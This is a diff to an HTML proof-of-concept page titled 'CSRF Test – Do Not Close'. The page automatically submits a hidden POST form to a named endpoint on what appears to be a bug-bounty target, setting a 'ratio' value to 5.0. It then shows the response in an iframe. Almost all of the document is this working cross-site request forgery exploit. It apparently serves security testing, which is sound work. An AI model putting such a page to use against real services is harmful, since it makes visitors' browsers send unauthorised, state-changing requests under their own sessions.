@@ -2,10 +2,12 @@
 <html>
   <body>
     <h1>CSRF Test – Do Not Close</h1>
-    <form id="csrfForm" method="POST" action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio">
+    <form id="csrfForm" method="POST" action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio" target="responseFrame">
+      <input type="hidden" name="ratio" value="5.0" />
     </form>
+    <iframe name="responseFrame" style="width:100%; height:200px; border:1px solid #ccc;"></iframe>
     <script>
-      document.getElementById("csrfForm").submit();
+      document.forms[0].submit();
     </script>
   </body>
 </html>
